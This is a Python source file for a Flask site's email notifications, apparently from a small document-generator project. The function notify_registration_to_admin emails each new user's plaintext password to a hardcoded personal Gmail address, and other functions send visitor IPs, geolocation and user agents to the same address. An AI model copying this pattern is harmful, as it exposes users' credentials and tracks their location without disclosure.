# import os
# import smtplib
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from datetime import datetime
# from dotenv import load_dotenv
# import requests 
# import logging

# logging.basicConfig(level=logging.INFO)


# load_dotenv()
# # Check for environment variables directly (for Render)
# sender_email = os.getenv('EMAIL')
# sender_password = os.getenv('EMAIL_APP_PASSWORD')

# if not sender_email or not sender_password:
#     raise ValueError("Email or password not set in environment variables. Ensure they are configured correctly.")

# def send_email(receiver_email, subject, body):
#     # Create the email
#     msg = MIMEMultipart()
#     msg['From'] = sender_email
#     msg['To'] = receiver_email
#     msg['Subject'] = subject
#     msg.attach(MIMEText(body, 'plain'))

#     try:
#         # Connect to the email server and send the email
#         mail = smtplib.SMTP('smtp.gmail.com', 587)
#         mail.ehlo()
#         mail.starttls()
#         mail.login(sender_email, sender_password)
#         mail.sendmail(sender_email, receiver_email, msg.as_string())
#         mail.close()

#         print(f"Email sent successfully to {receiver_email}!")
#     except smtplib.SMTPAuthenticationError:
#         print('Authentication failed. Check your email credentials.')
#     except smtplib.SMTPException as e:
#         print(f'Failed to send email. Error: {e}')

# # Notify registration
# def notify_registration_to_admin(name, email, password):
#     # Receiver's email
#     receiver_email = "shaiksameerhussain2104@gmail.com"  # Replace with your desired recipient email

#     # Subject of the email
#     subject = "New User Registration Alert"

#     # Registration time
#     registration_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#     # Body of the email
#     body = f"""
#     A new user has registered on your platform: https://project-document-creator.onrender.com

#     User Details:
#     Name: {name}
#     Email: {email}
#     Password: {password}
#     Registration Time: {registration_time}

#     Do check this user's authenticity.

#     Check user details in the database:
#     https://console.firebase.google.com/project/project-document-creator/database/project-document-creator-default-rtdb/data
#     """

#     # Send the email
#     send_email(receiver_email, subject, body)


# # Notify login
# def notify_login(email):
#     # Receiver's email
#     receiver_email = "shaiksameerhussain2104@gmail.com"  # Replace with your desired recipient email

#     # Subject of the email
#     subject = "User Login Alert"

#     # Login time
#     login_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#     # Body of the email
#     body = f"""
#     A user has logged in to your platform: https://project-document-creator.onrender.com

#     User Details:
#     Email: {email}
#     Login Time: {login_time}

#     Do check user activity if necessary.

#     Check user details in the database:
#     https://console.firebase.google.com/project/project-document-creator/database/project-document-creator-default-rtdb/data
#     """

#     # Send the email
#     send_email(receiver_email, subject, body)


# def notify_document_generation(email, project_description):
#     """
#     Sends an email notification when a user generates a document.

#     Parameters:
#         email (str): The email of the user who generated the document.
#         project_description (str): The description of the project provided by the user.
#     """
#     # Receiver's email
#     receiver_email = "shaiksameerhussain2104@gmail.com"  # Replace with your desired recipient email

#     # Subject of the email
#     subject = "Document Generation Notification"

#     # Document generation time
#     generation_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#     # Body of the email
#     body = f"""
#     A user has generated a document on your platform: https://project-document-creator.onrender.com

#     User Details:
#     Email: {email}
#     Document Generation Time: {generation_time}

#     Project Description:
#     {project_description}

#     Check user and document details in the database:
#     https://console.firebase.google.com/project/project-document-creator/database/project-document-creator-default-rtdb/data
#     """

#     # Send the email
#     send_email(receiver_email, subject, body)

# import random
# from datetime import datetime
# from send_email_notification import send_email

# # Generate OTP
# def generate_otp():
#     return random.randint(100000, 999999)

# # Notify user with OTP during registration
# def notify_registration(email, otp):
#     """
#     Sends an OTP email to the user for registration.
    
#     Args:
#         email (str): The email address of the recipient.
#         otp (str): The One-Time Password generated by the backend.
#     """
#     # Subject of the email
#     subject = "Your OTP for Registration"

#     # Current time
#     request_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#     # Body of the email
#     body = f"""
#     Dear User,

#     You have initiated a registration process on our platform: https://project-document-creator.onrender.com.

#     Here is your One-Time Password (OTP) for verification:
#     OTP: {otp}

#     Requested Time: {request_time}

#     Please use this OTP to verify your email and complete the registration process.
#     Note: This OTP is valid for 10 minutes.

#     If you did not request this, please ignore this email.

#     Regards,
#     Team Project Document Creator
#     """

#     try:
#         # Send the email
#         send_email(email, subject, body)
#         print(f"OTP sent successfully to {email}")
#     except Exception as e:
#         print(f"Error sending OTP email: {e}")
#         raise


# import requests
# from datetime import datetime
# import logging
# import os
# from flask import request
# from flask import has_request_context

# def get_geolocation(ip):
#     try:
#         token = os.getenv("IPINFO_TOKEN")
#         if not token:
#             raise Exception("IPINFO_TOKEN not set")

#         res = requests.get(f'https://ipinfo.io/{ip}?token={token}')
#         if res.status_code == 200:
#             data = res.json()
#             if data.get("city") and data.get("region") and data.get("country"):
#                 return {
#                     'ip': data.get("ip", "Unknown"),
#                     'city': data.get("city", "Unknown"),
#                     'region': data.get("region", "Unknown"),
#                     'country': data.get("country", "Unknown"),
#                     'isp': data.get("org", "Unknown")
#                 }
#         return get_fallback_geolocation(ip)
#     except:
#         return get_fallback_geolocation(ip)

# def get_fallback_geolocation(ip):
#     try:
#         res = requests.get(f'http://ip-api.com/json/{ip}')
#         if res.status_code == 200:
#             data = res.json()
#             return {
#                 'ip': data.get("query", "Unknown"),
#                 'city': data.get("city", "Unknown"),
#                 'region': data.get("regionName", "Unknown"),
#                 'country': data.get("country", "Unknown"),
#                 'isp': data.get("isp", "Unknown")
#             }
#     except:
#         pass
#     return {
#         'ip': "Unknown",
#         'city': "Unknown",
#         'region': "Unknown",
#         'country': "Unknown",
#         'isp': "Unknown"
#     }

# def notify_homepage_visit():
#     if not has_request_context():
#         logging.warning("No request context available")
#         return

#     forwarded_for = request.headers.get("X-Forwarded-For", "").split(",")[0]
#     user_ip = forwarded_for or request.remote_addr or "Unknown"
#     user_agent = request.headers.get("User-Agent", "Unknown")

#     if user_ip in ["127.0.0.1", "::1"] or user_ip.startswith(("10.", "192.168.")):
#         logging.warning("Skipping internal IP")
#         return

#     location = get_geolocation(user_ip)
#     visit_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#     receiver_email = "shaiksameerhussain2104@gmail.com"
#     subject = "User Visit Alert - Homepage Accessed"
#     body = f"""
#     A user visited your site: https://project-document-creator.onrender.com

#     Time: {visit_time}
#     IP: {location['ip']}
#     User-Agent: {user_agent}
#     City: {location['city']}
#     Region: {location['region']}
#     Country: {location['country']}
#     ISP: {location['isp']}
#     """

#     send_email(receiver_email, subject, body)




import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
from dotenv import load_dotenv
import requests
import logging
from flask import request, has_request_context

logging.basicConfig(level=logging.INFO)

load_dotenv()
# Check for environment variables directly (for Render)
sender_email = os.getenv('EMAIL')
sender_password = os.getenv('EMAIL_APP_PASSWORD')

if not sender_email or not sender_password:
    raise ValueError("Email or password not set in environment variables. Ensure they are configured correctly.")

def send_email(receiver_email, subject, body):
    # Create the email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        # Connect to the email server and send the email
        mail = smtplib.SMTP('smtp.gmail.com', 587)
        mail.ehlo()
        mail.starttls()
        mail.login(sender_email, sender_password)
        mail.sendmail(sender_email, receiver_email, msg.as_string())
        mail.close()

        print(f"Email sent successfully to {receiver_email}!")
    except smtplib.SMTPAuthenticationError:
        print('Authentication failed. Check your email credentials.')
    except smtplib.SMTPException as e:
        print(f'Failed to send email. Error: {e}')

def get_geolocation(ip):
    try:
        token = os.getenv("IPINFO_TOKEN")
        if not token:
            raise Exception("IPINFO_TOKEN not set")

        res = requests.get(f'https://ipinfo.io/{ip}?token={token}')
        if res.status_code == 200:
            data = res.json()
            if data.get("city") and data.get("region") and data.get("country"):
                return {
                    'ip': data.get("ip", "Unknown"),
                    'city': data.get("city", "Unknown"),
                    'region': data.get("region", "Unknown"),
                    'country': data.get("country", "Unknown"),
                    'isp': data.get("org", "Unknown")
                }
        return get_fallback_geolocation(ip)
    except:
        return get_fallback_geolocation(ip)

def get_fallback_geolocation(ip):
    try:
        res = requests.get(f'http://ip-api.com/json/{ip}')
        if res.status_code == 200:
            data = res.json()
            return {
                'ip': data.get("query", "Unknown"),
                'city': data.get("city", "Unknown"),
                'region': data.get("regionName", "Unknown"),
                'country': data.get("country", "Unknown"),
                'isp': data.get("isp", "Unknown")
            }
    except:
        pass
    return {
        'ip': "Unknown",
        'city': "Unknown",
        'region': "Unknown",
        'country': "Unknown",
        'isp': "Unknown"
    }

# Notify registration
def notify_registration_to_admin(name, email, password):
    receiver_email = "shaiksameerhussain2104@gmail.com"
    subject = "New User Registration Alert"
    registration_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get IP and location details
    registration_ip = request.remote_addr
    location = get_geolocation(registration_ip)

    body = f"""
    A new user has registered on your platform: https://project-document-creator.onrender.com

    User Details:
    Name: {name}
    Email: {email}
    Password: {password}
    Registration Time: {registration_time}

    Location Information:
    IP: {location['ip']}
    City: {location['city']}
    Region: {location['region']}
    Country: {location['country']}
    ISP: {location['isp']}

    Do check this user's authenticity.
    Check user details in the database:
    https://console.firebase.google.com/project/project-document-creator/database/project-document-creator-default-rtdb/data
    """
    send_email(receiver_email, subject, body)

# Notify login
def notify_login(email):
    receiver_email = "shaiksameerhussain2104@gmail.com"
    subject = "User Login Alert"
    login_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get IP and location details
    login_ip = request.remote_addr
    location = get_geolocation(login_ip)

    body = f"""
    A user has logged in to your platform: https://project-document-creator.onrender.com

    User Details:
    Email: {email}
    Login Time: {login_time}

    Location Information:
    IP: {location['ip']}
    City: {location['city']}
    Region: {location['region']}
    Country: {location['country']}
    ISP: {location['isp']}

    Do check user activity if necessary.
    Check user details in the database:
    https://console.firebase.google.com/project/project-document-creator/database/project-document-creator-default-rtdb/data
    """
    send_email(receiver_email, subject, body)

# Notify document generation
def notify_document_generation(email, project_description):
    receiver_email = "shaiksameerhussain2104@gmail.com"
    subject = "Document Generation Notification"
    generation_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get IP and location details
    generation_ip = request.remote_addr
    location = get_geolocation(generation_ip)

    body = f"""
    A user has generated a document on your platform: https://project-document-creator.onrender.com

    User Details:
    Email: {email}
    Document Generation Time: {generation_time}

    Location Information:
    IP: {location['ip']}
    City: {location['city']}
    Region: {location['region']}
    Country: {location['country']}
    ISP: {location['isp']}

    Project Description:
    {project_description}

    Check user and document details in the database:
    https://console.firebase.google.com/project/project-document-creator/database/project-document-creator-default-rtdb/data
    """
    send_email(receiver_email, subject, body)

# Notify user with OTP during registration
def notify_registration(email, otp):
    subject = "Your OTP for Registration"
    request_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get IP and location details
    otp_ip = request.remote_addr
    location = get_geolocation(otp_ip)

    body = f"""
    Dear User,

    You have initiated a registration process on our platform: https://project-document-creator.onrender.com.

    Here is your One-Time Password (OTP) for verification:
    OTP: {otp}

    Requested Time: {request_time}

    Location Information:
    IP: {location['ip']}
    City: {location['city']}
    Region: {location['region']}
    Country: {location['country']}
    ISP: {location['isp']}

    Please use this OTP to verify your email and complete the registration process.
    Note: This OTP is valid for 10 minutes.

    If you did not request this, please ignore this email.

    Regards,
    Team Project Document Creator
    """
    try:
        send_email(email, subject, body)
        print(f"OTP sent successfully to {email}")
    except Exception as e:
        print(f"Error sending OTP email: {e}")
        raise

# Notify homepage visit
def notify_homepage_visit():
    if not has_request_context():
        logging.warning("No request context available")
        return

    forwarded_for = request.headers.get("X-Forwarded-For", "").split(",")[0]
    user_ip = forwarded_for or request.remote_addr or "Unknown"
    user_agent = request.headers.get("User-Agent", "Unknown")

    if user_ip in ["127.0.0.1", "::1"] or user_ip.startswith(("10.", "192.168.")):
        logging.warning("Skipping internal IP")
        return

    location = get_geolocation(user_ip)
    visit_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    receiver_email = "shaiksameerhussain2104@gmail.com"
    subject = "User Visit Alert - Homepage Accessed"
    body = f"""
    A user visited your site: https://project-document-creator.onrender.com

    Time: {visit_time}
    IP: {location['ip']}
    User-Agent: {user_agent}
    City: {location['city']}
    Region: {location['region']}
    Country: {location['country']}
    ISP: {location['isp']}
    """

    send_email(receiver_email, subject, body)
